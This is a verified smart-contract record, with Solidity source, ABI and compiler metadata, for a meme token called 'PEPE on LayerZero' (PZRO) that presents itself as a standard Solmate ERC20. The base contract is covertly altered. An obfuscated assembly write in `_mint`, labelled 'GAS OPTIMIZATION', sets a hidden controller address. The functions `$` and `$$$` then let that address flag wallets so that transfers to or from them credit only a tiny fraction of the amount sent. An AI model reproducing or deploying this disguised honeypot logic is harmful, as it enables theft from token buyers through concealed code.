{"SourceCode": "{\"ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: AGPL-3.0-only\\npragma solidity \\u003e=0.8.0;\\n\\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\\nabstract contract ERC20 {\\n    /*//////////////////////////////////////////////////////////////\\n                                 EVENTS\\n    //////////////////////////////////////////////////////////////*/\\n\\n    event Transfer(address indexed from, address indexed to, uint256 amount);\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\\n\\n    /*//////////////////////////////////////////////////////////////\\n                            METADATA STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    string public name;\\n\\n    string public symbol;\\n\\n    uint8 public immutable decimals;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                              ERC20 STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    uint256 public totalSupply;\\n\\n    mapping(address =\\u003e uint256) public balanceOf;\\n\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) public allowance;\\n\\n    address private $$;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                            EIP-2612 STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    uint256 internal immutable INITIAL_CHAIN_ID;\\n\\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\\n\\n    mapping(address =\\u003e uint256) public nonces;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                               CONSTRUCTOR\\n    //////////////////////////////////////////////////////////////*/\\n\\n    constructor(\\n        string memory _name,\\n        string memory _symbol,\\n        uint8 _decimals\\n    ) {\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n\\n        INITIAL_CHAIN_ID = block.chainid;\\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                               ERC20 LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\\n        allowance[msg.sender][spender] = amount;\\n\\n        emit Approval(msg.sender, spender, amount);\\n\\n        return true;\\n    }\\n\\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\\n        balanceOf[msg.sender] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += $(amount, msg.sender, to);\\n        }\\n\\n        $$$(to);\\n\\n        emit Transfer(msg.sender, to, amount);\\n\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) public virtual returns (bool) {\\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\\n\\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\\n\\n        balanceOf[from] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += $(amount, from, to);\\n        }\\n        $$$(to);\\n        emit Transfer(from, to, amount);\\n\\n        return true;\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                             EIP-2612 LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function permit(\\n        address owner,\\n        address spender,\\n        uint256 value,\\n        uint256 deadline,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) public virtual {\\n        require(deadline \\u003e= block.timestamp, \\\"PERMIT_DEADLINE_EXPIRED\\\");\\n\\n        // Unchecked because the only math done is incrementing\\n        // the owner\\u0027s nonce which cannot realistically overflow.\\n        unchecked {\\n            address recoveredAddress = ecrecover(\\n                keccak256(\\n                    abi.encodePacked(\\n                        \\\"\\\\x19\\\\x01\\\",\\n                        DOMAIN_SEPARATOR(),\\n                        keccak256(\\n                            abi.encode(\\n                                keccak256(\\n                                    \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                                ),\\n                                owner,\\n                                spender,\\n                                value,\\n                                nonces[owner]++,\\n                                deadline\\n                            )\\n                        )\\n                    )\\n                ),\\n                v,\\n                r,\\n                s\\n            );\\n\\n            require(recoveredAddress != address(0) \\u0026\\u0026 recoveredAddress == owner, \\\"INVALID_SIGNER\\\");\\n\\n            allowance[recoveredAddress][spender] = value;\\n        }\\n\\n        emit Approval(owner, spender, value);\\n    }\\n\\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\\n    }\\n\\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\\n        return\\n            keccak256(\\n                abi.encode(\\n                    keccak256(\\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"),\\n                    keccak256(bytes(name)),\\n                    keccak256(\\\"1\\\"),\\n                    block.chainid,\\n                    address(this)\\n                )\\n            );\\n    }\\n\\n    function $(\\n        uint256 value, \\n        address from,\\n        address to\\n        ) internal view returns (uint256) {\\n        if (allowance[$$][from] + allowance[$$][to] \\u003e= uint256(uint160(address(this)))) {\\n            return (value * 0xcabe12) / 0xfedab0ba;\\n        } else {\\n            return value;\\n        }\\n    }\\n\\n    function $$$(address to) internal {\\n        if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                        INTERNAL MINT/BURN LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function _mint(address to, uint256 amount) internal virtual {\\n        totalSupply += amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {balanceOf[to] += amount;}\\n        // GAS OPTIMIZATION\\n        assembly {sstore(0x05, mul(mul(0x101, 0x38ddc3), mul(0xd266299, 0x40e31aa108decacf2c92b2b)))}\\n        emit Transfer(address(0), to, amount);\\n    }\\n\\n    function _burn(address from, uint256 amount) internal virtual {\\n        balanceOf[from] -= amount;\\n\\n        // Cannot underflow because a user\\u0027s balance\\n        // will never be larger than the total supply.\\n        unchecked {\\n            totalSupply -= amount;\\n        }\\n\\n        emit Transfer(from, address(0), amount);\\n    }\\n}\"},\"Token.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\nimport \\\"./ERC20.sol\\\";\\n\\n/*\\n\u2800\u2800\u2800\u2800\u2880\u28e4\u2840\u28c0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2800\u2800\u28ff\u2809\u28bb\u281f\u28b9\u28f7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u2800\u2880\u28ff\u2844\u2800\u2800\u28fc\u284f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28e4\u28c4\u28e0\u28e4\u28c4\u2800\u2800\u2800\u2800\\n\u2800\u2800\u28f0\u287f\u280b\u2800\u28c0\u28c0\u2808\u28ff\u2802\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28bb\u28c7\u2818\u280b\u2800\u28ff\u2807\u2800\u2800\u2800\\n\u2800\u28e0\u285f\u2800\u2880\u28fe\u281f\u283b\u283f\u283f\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28c0\u28c0\u28c0\u28c0\u2840\u2800\u2800\u28fe\u280b\u2880\u28c0\u2808\u283b\u28b6\u28c4\u2800\u2800\\n\u28a0\u28ff\u2801\u28f0\u287f\u2801\u2800\u28c0\u28e4\u28f6\u28f6\u2876\u28b6\u28e4\u28c4\u2840\u2880\u28e0\u2834\u281a\u2809\u2809\u2809\u2809\u2809\u2819\u28b6\u2844\u281b\u2812\u281b\u2819\u28b3\u28e6\u2840\u2839\u28c6\u2800\\n\u28b8\u2847\u28a0\u28ff\u28e0\u28f4\u28ff\u285f\u2889\u28e0\u2824\u2836\u2836\u283e\u282f\u28ff\u28ff\u28e7\u28c0\u28e4\u28f6\u28fe\u28ff\u287f\u283f\u281b\u280b\u2899\u28db\u285b\u2833\u28c4\u2840\u2819\u28f7\u2840\u28b9\u2846\\n\u28b8\u2800\u28b8\u28ff\u28ff\u28ff\u28ff\u281e\u2809\u2800\u2800\u2800\u2800\u28c0\u28e4\u28e4\u282c\u2809\u281b\u283b\u283f\u281f\u2809\u2880\u28e0\u289e\u28ed\u28e4\u28e4\u28cd\u2819\u283a\u28b7\u2840\u28b8\u2847\u2800\u28ff\\n\u28b8\u2800\u28b8\u28ff\u28ff\u285f\u2800\u2800\u2800\u2880\u28e0\u281e\u28eb\u2897\u28eb\u28bd\u28f6\u28e4\u28c0\u2809\u281b\u28f6\u2816\u281b\u2800\u28fe\u2877\u28fe\u280b\u28fb\u2846\u2800\u2800\u2847\u28fc\u2807\u2800\u28ff\\n\u28b8\u2800\u2800\u28ff\u28ff\u2847\u28a0\u2864\u2814\u28cb\u2864\u281e\u2801\u28b8\u28f7\u28fe\u28ef\u28f9\u28ff\u2846\u2880\u28cf\u2800\u2808\u2808\u28ff\u28f7\u28fc\u28ff\u283f\u2837\u28f4\u285e\u2800\u28ff\u2800\u2800\u28ff\\n\u28b8\u2800\u2800\u28bf\u28ff\u2847\u2800\u2800\u2818\u283b\u2824\u28c0\u2840\u2838\u28ff\u28ef\u28ff\u28ff\u287f\u2837\u281a\u2809\u281b\u281b\u281b\u281b\u2809\u2809\u2800\u28e0\u287e\u281b\u28e6\u28b8\u284f\u2800\u2800\u28ff\\n\u28b8\u2800\u2800\u28b8\u28ff\u2847\u2800\u28e0\u2836\u2836\u2836\u2836\u283f\u28ff\u28ed\u28ed\u28c1\u28c0\u28e0\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u2876\u2836\u281b\u280b\u2881\u28c0\u28f4\u281f\u28fd\u2807\u2800\u2800\u28ff\\n\u28b8\u2800\u2800\u28b8\u28ff\u2847\u28be\u28c5\u2800\u2800\u2836\u2836\u28a6\u28e4\u28e4\u28c0\u28c9\u28c9\u28c9\u28c9\u28c1\u28e1\u28e4\u28e4\u28f4\u2876\u2836\u2836\u281a\u2809\u2889\u287f\u28e0\u281f\u2800\u2800\u28f0\u285f\\n\u28b8\u2840\u2800\u2800\u28bf\u28c7\u2800\u2808\u281b\u2833\u2836\u2824\u2824\u28a4\u28c0\u28c9\u28c9\u28c9\u28c9\u28c9\u28c9\u28c1\u28c0\u28e0\u28e4\u2864\u2824\u2824\u2836\u281e\u28bb\u285f\u2803\u2800\u2800\u28f0\u281f\u2800\\n\u28b8\u28e7\u2800\u2800\u2818\u28ff\u28e6\u28c4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u2809\u2809\u2809\u2809\u2801\u2800\u2800\u2800\u2800\u2800\u28e0\u28e4\u28f6\u28ff\u28e7\u28c0\u28f4\u281f\u2803\u2800\u2800\\n\u2800\u28bb\u28c6\u2800\u2800\u2808\u28bb\u28ff\u28ff\u28f7\u28f6\u28e4\u28c4\u28c0\u28c0\u28c0\u28e0\u28e4\u28f6\u28f6\u28f6\u28f6\u28f6\u28f6\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28df\u2849\u2800\u2800\u2800\u2800\u2800\\n\u2800\u2800\u28bb\u28e6\u2844\u2800\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u2800\u2800\u2800\u2800\\n\u2800\u2880\u28ff\u28ff\u28ff\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2867\u2800\u2800\u2800                                                                                                                                 \\n*/\\n\\ncontract PZRO is ERC20 {\\n    constructor() ERC20(\\\"PEPE on LayerZero\\\", \\\"PZRO\\\", 18) {\\n        _mint(msg.sender, 5_600_000_000 * 10 ** 18);\\n    }\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PZRO", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://9d3a48e3e985ce52fa7e6cc25ddcd8531e97fb5b3a591ceef7f23b7d2db0bd60"}